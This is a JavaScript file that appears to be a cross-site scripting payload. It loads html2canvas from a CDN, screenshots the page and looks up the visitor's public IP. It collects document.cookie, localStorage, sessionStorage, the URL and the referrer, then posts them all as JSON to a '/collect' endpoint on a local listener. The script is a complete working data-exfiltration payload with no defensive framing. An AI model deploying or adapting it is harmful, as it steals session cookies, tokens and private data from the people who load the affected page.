(async () => {
  // Load html2canvas dynamically if not loaded
  if (typeof html2canvas === "undefined") {
    await new Promise((resolve, reject) => {
      const script = document.createElement("script");
      script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js";
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }

  // Wait a bit to ensure loading
  await new Promise(resolve => setTimeout(resolve, 1000));

  // Take screenshot
  let screenshotDataUrl = "";
  try {
    const canvas = await html2canvas(document.body);
    screenshotDataUrl = canvas.toDataURL("image/png");
  } catch (error) {
    screenshotDataUrl = `Screenshot failed: ${error.message}`;
  }

  // Get public IP via external API
  async function getPublicIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip || "Unavailable";
    } catch {
      return "Unavailable";
    }
  }

  const publicIP = await getPublicIP();

  const payload = {
  url: location.href,       // current page URL, always present
  cookies: document.cookie || "",
  userAgent: navigator.userAgent || "",
  referer: document.referrer || "",  // may be empty, where the user came from
  screenResolution: `${screen.width}x${screen.height}`,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  ipAddress: {
    publicIPv4: publicIP
  },
  screenshot: screenshotDataUrl
};


  try {
    await fetch("http://127.0.0.1:4000/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error("Failed to send payload:", e);
  }
})();
